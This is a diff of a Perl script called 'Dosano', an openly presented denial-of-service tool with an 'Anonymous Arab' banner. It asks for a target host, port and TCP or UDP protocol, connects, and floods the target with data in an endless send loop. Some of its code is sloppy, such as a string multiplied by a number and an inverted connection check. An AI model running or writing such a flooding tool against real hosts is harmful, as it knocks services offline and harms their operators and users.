@@ -1,33 +1,44 @@
 #!/usr/bin/perl
-# Simple denial of service attack In Perl Using Socket Module :)
+#==============INFO==============#
+# SCRIPT: Dosano
+#    JOB: Denial Of Service Attack[DosAttack]
+#CodedBy: Oseid Aldary
+
+#=== Use Modules ===#
 use IO::Socket;
 use Scalar::Util qw(looks_like_number);
-use Net::Ping;
 
-system("clear || cls");
+#=== Clear Screen ===#
+system("cls || clear");
+
 #Script Banner================================================================
-print q{
-                   .-"      "-.
-                  /            \
-                 |    JOKER11   |
-                 |,  .-.  .-.  ,|
-                 | )(__/  \__)( |
-                 |/     /\     \|
-       (@_       (_     ^^     _)
-  _     ) \_______\__|IIIIII|__/__________________________
- (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_>
-        )_/        \          /
-       (@           `--------` Welcome!
+print q{ 
+                   .-"      "-.  
+                  /            \ 
+                 |    JOKER11   | 
+                 |,  .-.  .-.  ,| 
+                 | )(__/  \__)( | 
+                 |/     /\     \| 
+       (@_       (_     ^^     _) 
+  _     ) \_______\__|IIIIII|__/__________________________ 
+ (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_> 
+        )_/        \          / 
+       (@           `--------` Welcome! 
 
  [---]   by:> OSEID ALDARY   [---]
- [---]   Version:> 1.5	     [---]
 };
 # Check Intenret Connection !
-my $check = Net::Ping->new("icmp");
-if (!($check->ping("www.google.com"))){
-	print "\n[!] Error: Please Check Your Internet Connection !!!";
+my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
+	'PeerPort'=>80, 
+	'Timeout'=>2, 
+	'proto'=>'tcp');
+if(!defined $check && $check){
+	print("[-] Internet Status[ Not Connected ]");
+	print("\n[!] Error: Please Check Your Internet Connection !!!");
 	exit(1);
 }
+print("\n[+] Internet Status[ Connected ]\n");
+$check->close();
 
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
@@ -62,22 +73,21 @@ while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "Protocol ==> $proto";
 print "\n===============================\n";
 sleep(1);
-{
-$sock = IO::Socket::INET->new (
+# Create The Socket
+$sock = IO::Socket::INET->new(
         PeerAddr => $host,
         PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Error: Connection Failed To Target[ $host ] !!!\n[!] Please Check Your TargetIP !";
-}
+        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
 system("clear || cls");
 print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
-sleep(3);
+sleep(1);
 while (1) {
   $size = rand() * 8921873 * 99919988;
   print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
   send($sock, $size*2, $size*2); 
   send($sock, $size*3, $size*3);
   send($sock, $size*4, $size*4);
-  send($sock, $size*9999999999,$size*9999999999);
+  send($sock, $size*9999999999999,$size*9999999999999);
   send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*3)
 }
 ##############################################################
